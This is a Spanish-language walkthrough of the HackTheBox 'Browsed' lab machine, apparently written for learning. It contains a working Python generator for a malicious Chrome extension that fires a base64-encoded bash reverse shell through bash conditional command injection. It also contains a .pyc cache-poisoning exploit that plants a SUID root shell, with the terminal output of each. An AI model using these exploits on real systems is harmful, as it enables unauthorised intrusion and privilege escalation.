### 1. Enumeración inicial

Empezamos enumerando las puertos abiertos de esta máquina:

```shell
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.8.1 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 14:29 +0000
Initiating SYN Stealth Scan at 14:29
Scanning 10.10.8.1 [65535 ports]
Discovered open port 22/tcp on 10.10.8.1
Discovered open port 80/tcp on 10.10.8.1
Completed SYN Stealth Scan at 14:30, 15.16s elapsed (65535 total ports)
Nmap scan report for 10.10.8.1
Host is up, received user-set (0.087s latency).
Scanned at 2026-01-12 14:29:46 WET for 15s
Not shown: 65528 closed tcp ports (reset), 5 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
           Raw packets sent: 75310 (3.314MB) | Rcvd: 74346 (2.974MB)
```

---
### 2. Enumeración web

Tenemos un servicio web corriendo por el puerto `80` y el ssh abierto por el puerto `22`. Añadimos `browsed.htb` al /etc/hosts y empezamos a enumerar el sitio web.

De primeras vemos que la web tiene una funcionalidad para subir extensiones de Google Chrome: http://browsed.htb/upload.php.

![[1]](img/1.png)

Va a tirar por acá la máquina, el icono de la máquina en HackTheBox encima es el icono del navegador llorando.

También tenemos un apartado **Examples** con extensiones de chrome que podemos descargar para tener de referencia. http://browsed.htb/samples.html

![[2]](img/2.png)

Voy a descargarme una para ver el contenido y como tiene que estar formado el archivo.

```shell
❯ unzip fontify.zip
Archive:  fontify.zip
  inflating: content.js              
  inflating: manifest.json           
  inflating: popup.html              
  inflating: popup.js                
  inflating: style.css
```

De los archivos extraídos del zip, vemos que los javascript manejan la lógica de la extensión. Si nos fijamos en la página para subir nuestra propia extensión, **nos chiva que un desarrollador chequeará nuestra extensión**. Con esa pista y el lenguaje que usan las extensiones, podemos suponer que debemos explotar un **Stored XSS** (no va a ser el caso).

Voy a subir un `a.zip` con cualquier contenido a ver que responde la página.

```shell
❯ zip a.zip a.png
  adding: a.png (stored 0%)
```

Al subirlo, veremos que va a provocar diversos errores en el output. Esto parece intended por el creador de la máquina, **hay un dominio browsedinternals.htb en dicho ouput**:

![[3]](img/3.png)

---
### 3. Aplicación interna y análisis del código

Añadimos al /etc/hosts el dominio `browsedinternals.htb`, voy a entrar a enumerarlo. Se trata de un **Gitea**, con un proyecto accesible sin iniciar sesión en el mismo.

![[4]](img/4.png)

Se trata de una aplicación hecha en Python principalmente, que permite convertir archivos markdown a html. El desarrollador deja una nota de que dicho aplicativo **se encuentra en desarrollo, y que debería correr solo en local**. Lo más probable es que el servidor lo esté corriendo en local, y podamos explotarlo subiendo una extensión maliciosa. 

Si miramos el **app.py** veremos estas líneas:

```python
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])
    return "Routine executed !"
```

Este código se encadena al script vulnerable **routines.sh** que podemos ver en el proyecto de Gitea también:

```bash
#!/bin/bash

ROUTINE_LOG="/home/larry/markdownPreview/log/routine.log"
BACKUP_DIR="/home/larry/markdownPreview/backups"
DATA_DIR="/home/larry/markdownPreview/data"
TMP_DIR="/home/larry/markdownPreview/tmp"

log_action() {
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$ROUTINE_LOG"
}

if [[ "$1" -eq 0 ]]; then
  # Routine 0: Clean temp files
  find "$TMP_DIR" -type f -name "*.tmp" -delete
  log_action "Routine 0: Temporary files cleaned."
  echo "Temporary files cleaned."

elif [[ "$1" -eq 1 ]]; then
  # Routine 1: Backup data
  tar -czf "$BACKUP_DIR/data_backup_$(date '+%Y%m%d_%H%M%S').tar.gz" "$DATA_DIR"
  log_action "Routine 1: Data backed up to $BACKUP_DIR."
  echo "Backup completed."

elif [[ "$1" -eq 2 ]]; then
  # Routine 2: Rotate logs
  find "$ROUTINE_LOG" -type f -name "*.log" -exec gzip {} \;
  log_action "Routine 2: Log files compressed."
  echo "Logs rotated."

elif [[ "$1" -eq 3 ]]; then
  # Routine 3: System info dump
  uname -a > "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  df -h >> "$BACKUP_DIR/sysinfo_$(date '+%Y%m%d').txt"
  log_action "Routine 3: System info dumped."
  echo "System info saved."

else
  log_action "Unknown routine ID: $1"
  echo "Routine ID not implemented."
fi

```

La vulnerabilidad es una **inyección de comandos por ruptura de condición bash**. Aunque `routines.sh` valida `$1` con `[[ "$1" -eq 0 ]]`, esta validación es vulnerable porque `-eq` evalúa expresiones aritméticas. Un payload como `0 ]]; malicious_command; #` se interpreta así:

1. `0` pasa la validación (`0 -eq 0` es verdadero)
   
2. `]]` cierra el test condicional
   
3. `malicious_command;` se ejecuta como comando separado

4. `#` comenta el `fi` restante

---
### 4. RCE mediante extensión Chrome y User Flag

Vamos a crear un exploit que creará una extensión Chrome maliciosa, Al subirse se ejecutará en el servidor, **enviará peticiones HTTP al endpoint interno vulnerable http://127.0.0.1:5000/routines con payloads que rompen la estructura condicional del script de bash**. El payload contiene un reverse shell codificado en base64 que nos lo mandará a la máquina de atacante. 

La vulnerabilidad es posible porque la aplicación de Python se ejecuta en localhost sin medidas de autenticación y pasa entrada de usuario directamente al script **routines.sh** sin sanitización adecuada.

```python
import zipfile
import io
import base64

def crear_extension_maliciosa(ip_atacante, puerto="9001"):
    zip_buffer = io.BytesIO()
    
    # 1. Shell inverso (Bash estándar)
    # Lo codificamos en base64 para evitar romper el JSON o la URL
    raw_shell = f"bash -i >& /dev/tcp/{ip_atacante}/{puerto} 0>&1"
    b64_shell = base64.b64encode(raw_shell.encode()).decode()
    
    # Este es el payload que se ejecutará en el servidor
    # Se auto-decodifica y lo redirige a bash
    shell_payload = f"echo${{IFS}}{b64_shell}|base64${{IFS}}-d|bash"

    # 2. Manifest V3
    manifest = '''{
        "manifest_version": 3,
        "name": "Security Optimizer",
        "version": "1.1",
        "background": {
            "service_worker": "background.js"
        },
        "host_permissions": ["*://127.0.0.1/*", "*://localhost/*"]
    }'''

    # 3. background.js
    # Probamos ambos caminos: el de rutina y una inyección potencial
    background = f'''
    const ip = "{ip_atacante}";
    const payload = "{shell_payload}";
    
    // Lo enviamos via un bucle en background para asegurar que se ejecute
    async function triggerShell() {{
        const urls = [
            `http://127.0.0.1:5000/routines/a[$(${{payload}})]`,
            `http://127.0.0.1:5000/routines/a';${{payload}} #`
        ];

        for (const url of urls) {{
            fetch(url, {{ mode: 'no-cors' }});
        }}
    }}

    triggerShell();
    '''

    with zipfile.ZipFile(zip_buffer, 'a', zipfile.ZIP_DEFLATED) as zip_file:
        zip_file.writestr("manifest.json", manifest)
        zip_file.writestr("background.js", background)

    with open("exploit.zip", "wb") as f:
        f.write(zip_buffer.getvalue())

    print(f"[+] exploit.zip creado.")
    print(f"[+] Comando listener: nc -lvnp {puerto}")
    print(f"[+] Payload codificado: {shell_payload}")

if __name__ == "__main__":
    crear_extension_maliciosa("10.10.15.254", "4444")

```

Ejecución:

```bash
❯ python3 exploit.py
[+] exploit.zip creado.
[+] Comando listener: nc -lvnp 4444
[+] Payload codificado: echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yNTQvNDQ0NCAwPiYx|base64${IFS}-d|bash
```

Subimos el archivo `exploit.zip` al servidor y nos ponemos en escucha por el puerto 4444 para recibir la reverse shell en nuestra máquina de atacante:

```shell
❯ penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.10.0.100 • 192.168.0.1 • 172.18.0.1 • 172.17.0.1 • 10.10.15.254
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from browsed~10.10.8.1-Linux-x86_64 😍️ Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /home/larry/markdownPreview/.env/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/abra/.penelope/sessions/browsed~10.10.8.1-Linux-x86_64/2026_01_12-16_01_50-116.log 📜
────────────────────────────────────────────────────────────────────────────────────
larry@browsed:~/markdownPreview$ cd
larry@browsed:~$ ls
markdownPreview  user.txt
```

Con esto acabamos de obtener la user flag. Toca obtener la root flag.

---
### 5. Enumeración de la máquina

Si ejecutamos `sudo -l` vemos que nuestro usuario larry tiene permisos para ejecutar un script python `/opt/extensiontool/extension_tool.py` como root sin necesidad de credenciales:

```shell
larry@browsed:~$ sudo -l
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Enumero primero el directorio `/opt/extensiontool`:

```shell
larry@browsed:~$ ls -l /opt/extensiontool/
total 16
drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions
-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py
-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py
drwxrwxrwx 2 root root 4096 Jan 12 15:00 __pycache__
```

No tenemos permisos para escribir/modificar el script, no pasa nada, también **tenemos permisos totales en __pycache__**. Vamos a ver el código del `extension_tool.py`:

```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()
```

También leamos el `/opt/extensiontool/extension_utils.py`:

```python
import os
import json
import subprocess
import shutil
from jsonschema import validate, ValidationError

# Simple manifest schema that we'll validate
MANIFEST_SCHEMA = {
    "type": "object",
    "properties": {
        "manifest_version": {"type": "number"},
        "name": {"type": "string"},
        "version": {"type": "string"},
        "permissions": {"type": "array", "items": {"type": "string"}},
    },
    "required": ["manifest_version", "name", "version"]
}

# --- Manifest validate ---
def validate_manifest(path):
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    try:
        validate(instance=data, schema=MANIFEST_SCHEMA)
        print("[+] Manifest is valid.")
        return data
    except ValidationError as e:
        print("[x] Manifest validation error:")
        print(e.message)
        exit(1)

# --- Clean Temporary Files ---
def clean_temp_files(extension_dir):
    """ Clean up temporary files or unnecessary directories after packaging """
    temp_dir = '/opt/extensiontool/temp'

    if os.path.exists(temp_dir):
        shutil.rmtree(temp_dir)
        print(f"[+] Cleaned up temporary directory {temp_dir}")
    else:
        print("[+] No temporary files to clean.")
    exit(0)
```

---
### 6. Escalada de privilegios a root

Vamos a explotar una vulnerabilidad conocida como **"Python .pyc Cache Poisoning"** que combina múltiples fallos de seguridad. Vamos a estar usando este **exploit** en la máquina víctima: 

```python
import os
import py_compile
import shutil
import sys

ORIGINAL_SRC = "/opt/extensiontool/extension_utils.py"
MALICIOUS_SRC = "/tmp/extension_utils.py"
TARGET_PYC = "/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc"

stat = os.stat(ORIGINAL_SRC)
target_size = stat.st_size

# El payload que se ejecutará como root
payload = 'import os\ndef validate_manifest(path): os.system("cp /bin/bash /tmp/bashp && chmod +s /tmp/bashp"); return {}\ndef clean_temp_files(arg): pass\n'

# Rellenar con comentarios para igualar el tamaño exacto del archivo original
padding_needed = target_size - len(payload)
payload += "#" * padding_needed

with open(MALICIOUS_SRC, "w") as f:
    f.write(payload)

# Sincronizar marcas de tiempo
os.utime(MALICIOUS_SRC, (stat.st_atime, stat.st_mtime))

# Compilar
py_compile.compile(MALICIOUS_SRC, cfile="/tmp/exploit.pyc")

# Inyectar
if os.path.exists(TARGET_PYC):
    os.remove(TARGET_PYC)
shutil.copy("/tmp/exploit.pyc", TARGET_PYC)
print("[+] .pyc envenenado inyectado exitosamente")
```

Este exploit hace lo siguiente:

1. **Permisos Inseguros en `__pycache__`**: 
   El directorio `__pycache__/` tiene permisos `drwxrwxrwx` (777), lo que permite a cualquier usuario escribir archivos `.pyc` (bytecode compilado de Python).

2. **Mecanismo de Caché de Python**:
   Cuando Python importa un módulo, primero busca un archivo `.pyc` en `__pycache__/`. Si existe y su timestamp es **igual o más reciente** que el archivo `.py` fuente, Python carga el bytecode precompilado en lugar de recompilar desde el fuente.

3. **Técnica de Ataque - Timestamp Spoofing**:
   El exploit:
   - Analiza el archivo original `extension_utils.py` para obtener su tamaño exacto y timestamps.
   - Crea un archivo `.py` malicioso con el mismo tamaño (usando comentarios como padding).
   - Copia los timestamps exactos del archivo original mediante `os.utime()`.
   - Compila este archivo a `.pyc` usando `py_compile.compile()`.
   - Sobrescribe el `.pyc` legítimo en `__pycache__/`.

4. **Payload Malicioso**:
   Inyectamos el payload `os.system("cp /bin/bash /tmp/bashp && chmod +s /tmp/bashp")`. Este payload copia `/bin/bash` en `/tmp/bashp` **y le da permisos SUID**. Cómo el payload se acaba ejecutando como root por los permisos sudo que tenemos sobre el script de Python, podemos escalar a root de esta forma.

5. **Ejecución con Privilegios Elevados**:
   Al ejecutar `sudo /opt/extensiontool/extension_tool.py`, el script corre como **root**. Python importa `extension_utils` desde el `.pyc` comprometido y ejecuta el payload anterior con privilegios root, haciendo la copia de /bin/bash con permisos SUID.

Ejecución del exploit:

```shell
larry@browsed:/tmp$ nano exploit.py
larry@browsed:/tmp$ python3 exploit.py
[+] .pyc envenenado inyectado exitosamente
```

Ejecutamos el binario con sudo para que Python importe el `extension_utils`, ejecutando el payload del exploit en la máquina vulnerable, **creando /tmp/bashp**:

```shell
larry@browsed:/tmp$ sudo /opt/extensiontool/extension_tool.py --ext Timer
[-] Skipping version bumping
[-] Skipping packaging
larry@browsed:/tmp$ /tmp/bashp -p
bashp-5.2# whoami
root
bashp-5.2# cd /root
bashp-5.2# ls root.txt
root.txt
```

Listo, máquina comprometida con éxito.